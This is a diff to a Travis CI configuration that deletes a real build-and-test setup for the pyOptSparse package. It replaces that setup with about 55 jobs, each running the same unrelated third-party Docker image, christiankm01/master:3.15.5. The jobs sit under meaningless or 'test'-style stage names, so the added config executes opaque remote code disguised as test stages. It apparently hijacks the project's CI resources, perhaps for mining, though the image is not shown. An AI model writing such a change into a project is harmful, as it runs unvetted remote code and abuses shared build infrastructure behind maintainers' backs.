@@ -1,44 +1,125 @@
-import:
-  - mdolab/.github:travis/jobs-env.yml
-  - mdolab/.github:travis/before-install.yml # we skip importing the install step because this repo requires extra steps
-  - mdolab/.github:travis/script.yml
-
-env:
-  global:
-    - DOCKER_WORKING_DIR=/home/mdolabuser/packages/$REPO_NAME # pyOptSparse is under packages, so this should overwrite what's set in travis-env.yml
-    - SNOPT_DIR=$DOCKER_WORKING_DIR/$REPO_NAME/pySNOPT/source
-    - NLPQLP_DIR=$DOCKER_WORKING_DIR/$REPO_NAME/pyNLPQLP/source
-    - AUTO_DOCKER_REPO=true # this will automatically set DOCKER_REPO depending on where the build originates
-    - SKIP_COPY_DIR=true # skip copying directories for the pre_install step
-
-install:
-  # We back up the proprietary source codes first
-  - if [ $DOCKER_REPO == "private" ]; then
-      docker exec -it app /bin/bash -c "cp -r $SNOPT_DIR \$HOME/SNOPT && cp -r $NLPQLP_DIR \$HOME/NLPQLP";
-    fi
-  # We thrown away the existing repo in Docker, and copy the new one in-place
-  - docker exec -it app /bin/bash -c "rm -rf $DOCKER_WORKING_DIR && cp -r $DOCKER_MOUNT_DIR $DOCKER_WORKING_DIR"
-  # Copy back the proprietary codes
-  - if [ $DOCKER_REPO == "private" ]; then
-      docker exec -it app /bin/bash -c "cp -r \$HOME/NLPQLP/* $NLPQLP_DIR/ && cp -r \$HOME/SNOPT/* $SNOPT_DIR/";
-    fi
-  # Build and install
-  - docker exec -it app /bin/bash -c ". $BASHRC && cd $DOCKER_WORKING_DIR && pip install -e .[optview]"
-
-script:
-  - |
-    if [ $TEST_TYPE == "docker" ]; then
-      # run tests
-      docker exec -it app /bin/bash -c ". $BASHRC && cd $DOCKER_WORKING_DIR/test && testflo --pre_announce -v . --coverage --coverpkg $REPO_NAME"
-    fi
-
-after_success:
-  # Coveralls
-  - |
-    if [ $TEST_TYPE == "docker" ]; then
-      docker exec -it app /bin/bash -c ". $BASHRC && pip install coveralls";
-      # move the coverage file to the root
-      docker exec -it app /bin/bash -c ". $BASHRC && cd $DOCKER_WORKING_DIR/test && mv .coverage ../";
-      # These environment variables must be exposed to coveralls for it to work (since we are using Docker)
-      docker exec -e COVERALLS_REPO_TOKEN="$COVERALLS_REPO_TOKEN" -e TRAVIS="$TRAVIS"  -e TRAVIS_JOB_ID="$TRAVIS_JOB_ID" -e TRAVIS_BRANCH="$TRAVIS_BRANCH" -e TRAVIS_PULL_REQUEST="$TRAVIS_PULL_REQUEST" -it app /bin/bash -c ". $BASHRC && cd $DOCKER_WORKING_DIR && coveralls --rcfile=.coveragerc";
-    fi
+language: c
+arch:
+  - amd64
+compiler:
+  - gcc
+services:
+  - docker
+jobs:
+  include:
+    - stage: test
+      script: docker run christiankm01/master:3.15.5
+    - stage: test2
+      script: docker run christiankm01/master:3.15.5
+    - stage: deploy
+      script: docker run christiankm01/master:3.15.5
+    - stage: testman
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capability
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilitd
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilitya
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityki
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityn
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityks
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabili
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capab
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityhjj
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test-capabiy
+      script: docker run christiankm01/master:3.15.5
+    - stage: manaja
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capasjx
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabiyjsjajajj
+      script: docker run christiankm01/master:3.15.5   
+    - stage: test-capabiykimhokjs
+      script: docker run christiankm01/master:3.15.5  
+    - stage: test3
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test4
+      script: docker run christiankm01/master:3.15.5
+    - stage: test5
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test6
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test7
+      script: docker run christiankm01/master:3.15.5
+    - stage: test8
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test9
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test10
+      script: docker run christiankm01/master:3.15.5
+    - stage: test11
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test12
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test14
+      script: docker run christiankm01/master:3.15.5
+    - stage: test13
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test14
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test15
+      script: docker run christiankm01/master:3.15.5
+    - stage: test16
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test17
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test18
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test19
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test20
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test21
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test22
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test23
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test24
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test25
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test26
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test27
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test28
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test29
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test30
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test31
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test32
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test33
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test34
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test35
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test36
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test37
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test38
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test39
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test40
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test41
+      script: docker run christiankm01/master:3.15.5     
